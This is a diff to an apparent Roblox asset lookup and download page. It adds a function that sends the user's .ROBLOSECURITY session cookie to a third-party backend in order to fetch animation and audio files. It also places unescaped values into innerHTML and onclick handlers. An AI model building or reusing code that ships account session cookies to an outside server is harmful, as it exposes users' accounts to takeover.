@@ -129,6 +129,9 @@
 <label>.ROBLOSECURITY Cookie:</label>
 <input id="cookie" type="password" placeholder="*Required for asset infomation. Do not need it for just downloading Image/Decal Assets*">
 
+<label>Place ID (optional):</label>
+<input id="placeId" placeholder="Optional. Used to resolve Roblox-Place-Id and Roblox-Game-Id.">
+
 <button onclick="lookup()">Execute</button>
 
 <h3>Asset Info</h3>
@@ -138,9 +141,11 @@
 <div id="creatorInfo" class="glass"></div>
 
 <script>
+const backend = "https://api-starproductions.onrender.com";
+
 async function fetchThumbnail(assetId) {
     try {
-        const res = await fetch(`https://api-starproductions.onrender.com/thumbnail/${assetId}`);
+        const res = await fetch(`${backend}/thumbnail/${assetId}`);
         const text = await res.text();
         if (!res.ok) return null;
         const data = JSON.parse(text);
@@ -154,14 +159,13 @@ async function fetchThumbnail(assetId) {
 async function lookup() {
     const ids = document.getElementById("assetIds").value.trim();
     const cookie = document.getElementById("cookie").value.trim();
+    const placeInput = document.getElementById("placeId").value.trim();
 
     const assetBox = document.getElementById("assetInfo");
     const creatorBox = document.getElementById("creatorInfo");
 
     assetBox.innerHTML = "Loading... (our API is warming up. *Up to 50Seconds*)";
     creatorBox.innerHTML = "";
-
-    const backend = "https://api-starproductions.onrender.com";
 
     if (ids && !cookie) {
         const thumbUrl = await fetchThumbnail(ids);
@@ -219,10 +223,59 @@ async function lookup() {
         }
 
         const asset = data.data[0];
+        const creator = asset.creator || {};
+        const creatorType = creator.type || null;
+        const creatorId = creator.targetId || null;
 
-        let downloadPanel = `
-            <div class="asset-right">
-                <div style="margin-bottom:10px;">Image assets can be downloaded.</div>
+        let imagePanel = `
+            <div style="margin-bottom:10px;">Image assets can be downloaded.</div>
+            <button disabled style="
+                background:#7a1f1f;
+                color:#2a0000;
+                padding:8px 12px;
+                border-radius:8px;
+                font-weight:bold;
+                width:100%;
+            ">Not Available</button>
+        `;
+
+        if (asset.type === "Image" || asset.type === "Decal") {
+            const thumbUrl = await fetchThumbnail(ids);
+
+            if (thumbUrl) {
+                imagePanel = `
+                    <div style="margin-bottom:10px;">Image assets can be downloaded.</div>
+                    <button style="
+                        background:#4a8;
+                        color:#000;
+                        padding:8px 12px;
+                        border-radius:8px;
+                        font-weight:bold;
+                        width:100%;
+                    " onclick="window.open('${thumbUrl}', '_blank')">
+                        Download
+                    </button>
+                `;
+            }
+        }
+
+        let aaButton;
+        if (asset.type === "Animation" || asset.type === "Audio") {
+            aaButton = `
+                <button style="
+                    background:#4a8;
+                    color:#000;
+                    padding:8px 12px;
+                    border-radius:8px;
+                    font-weight:bold;
+                    width:100%;
+                    margin-top:8px;
+                " onclick="downloadAsset('${ids}', '${asset.type}', '${creatorType}', '${creatorId}')">
+                    Download
+                </button>
+            `;
+        } else {
+            aaButton = `
                 <button disabled style="
                     background:#7a1f1f;
                     color:#2a0000;
@@ -230,31 +283,19 @@ async function lookup() {
                     border-radius:8px;
                     font-weight:bold;
                     width:100%;
-                ">Not Available</button>
+                    margin-top:8px;
+                ">
+                    Not Available
+                </button>
+            `;
+        }
+
+        const aaPanel = `
+            <div style="margin-top:15px;">
+                <div style="margin-bottom:5px;">Animation/Audios can be downloaded.</div>
+                ${aaButton}
             </div>
         `;
-
-        if (asset.type === "Image" || asset.type === "Decal") {
-            const thumbUrl = await fetchThumbnail(ids);
-
-            if (thumbUrl) {
-                downloadPanel = `
-                    <div class="asset-right">
-                        <div style="margin-bottom:10px;">Image assets can be downloaded.</div>
-                        <button style="
-                            background:#4a8;
-                            color:#000;
-                            padding:8px 12px;
-                            border-radius:8px;
-                            font-weight:bold;
-                            width:100%;
-                        " onclick="window.open('${thumbUrl}', '_blank')">
-                            Download
-                        </button>
-                    </div>
-                `;
-            }
-        }
 
         assetBox.innerHTML = `
             <div class="asset-container">
@@ -263,19 +304,63 @@ async function lookup() {
                     <div class="glass">Asset Type: ${asset.type}</div>
                     <div class="glass">Asset Moderated: ${asset.isModerated}</div>
                 </div>
-                ${downloadPanel}
+                <div class="asset-right">
+                    ${imagePanel}
+                    ${aaPanel}
+                </div>
             </div>
         `;
 
-        const creator = asset.creator;
-        const targetId = creator.targetId;
+        if (creatorType === "User") {
+            fetchUser(creatorId);
+        } else if (creatorType === "Group") {
+            fetchGroup(creatorId);
+        }
+    } catch (err) {
+        assetBox.innerHTML = `<pre>${err}</pre>`;
+    }
+}
 
-        if (creator.type === "User") {
-            fetchUser(targetId);
-        } else if (creator.type === "Group") {
-            fetchGroup(targetId);
+async function downloadAsset(assetId, assetType, creatorType, creatorId) {
+    const cookie = document.getElementById("cookie").value.trim();
+    const placeInput = document.getElementById("placeId").value.trim();
+    const assetBox = document.getElementById("assetInfo");
+
+    if (!cookie) {
+        assetBox.innerHTML = `<pre>{"error":"Cookie is required to download Animation/Audio assets."}</pre>`;
+        return;
+    }
+
+    try {
+        const res = await fetch(backend + "/delivery", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                assetId,
+                cookie,
+                placeId: placeInput || null,
+                creatorId: creatorId || null,
+                creatorType: creatorType || null
+            })
+        });
+
+        const text = await res.text();
+
+        if (!res.ok) {
+            assetBox.innerHTML = `<pre>${text}</pre>`;
+            return;
         }
 
+        const data = JSON.parse(text);
+        let url = data.location;
+
+        if (assetType === "Animation") {
+            url += (url.includes("?") ? "&" : "?") + "starExt=.rbxm";
+        } else if (assetType === "Audio") {
+            url += (url.includes("?") ? "&" : "?") + "starExt=.ogg";
+        }
+
+        window.open(url, "_blank");
     } catch (err) {
         assetBox.innerHTML = `<pre>${err}</pre>`;
     }
@@ -285,7 +370,7 @@ async function fetchUser(userId) {
     const creatorBox = document.getElementById("creatorInfo");
 
     try {
-        const res = await fetch(`https://api-starproductions.onrender.com/user/${userId}`);
+        const res = await fetch(`${backend}/user/${userId}`);
         const text = await res.text();
 
         if (!res.ok) {
@@ -310,7 +395,7 @@ async function fetchGroup(groupId) {
     const creatorBox = document.getElementById("creatorInfo");
 
     try {
-        const res = await fetch(`https://api-starproductions.onrender.com/group/${groupId}`);
+        const res = await fetch(`${backend}/group/${groupId}`);
         const text = await res.text();
 
         if (!res.ok) {
